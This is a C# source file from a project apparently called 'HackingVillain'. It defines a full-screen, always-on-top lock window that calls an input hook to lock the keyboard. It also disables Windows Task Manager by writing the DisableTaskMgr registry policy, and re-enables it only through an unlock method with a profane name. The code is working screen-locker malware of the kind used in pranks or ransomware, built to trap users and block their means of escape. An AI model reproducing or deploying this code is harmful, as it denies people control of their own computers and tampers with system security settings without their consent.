using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace HackingVillain
{
    public partial class LockForm : Form
    {
        Hooker _hook;
        public LockForm(Hooker hook)
        {
            InitializeComponent();
            _hook = hook;

            this.Size = new Size(10000, 10000);
            this.TopMost = true;
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);

            _hook.Lock();
            TaskManager(false);
            TopMostAlways.SetTopmost(this.Handle);
        }

        /// <summary>
        /// 끝나는거
        /// </summary>
        public void Fuck()
        {
            _hook.UnLock();
            TaskManager(true);
            this.Hide();
        }

        void TaskManager(bool enabled)
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (enabled && objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
            else
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
    }

    class TopMostAlways
    {
        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
        static readonly IntPtr HWND_TOP = new IntPtr(0);
        static readonly IntPtr HWND_BOTTOM = new IntPtr(1);
        const UInt32 SWP_NOSIZE = 0x0001;
        const UInt32 SWP_NOMOVE = 0x0002;
        const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        public static void SetTopmost(IntPtr handle)
        {
            SetWindowPos(handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);
        }
    }
}
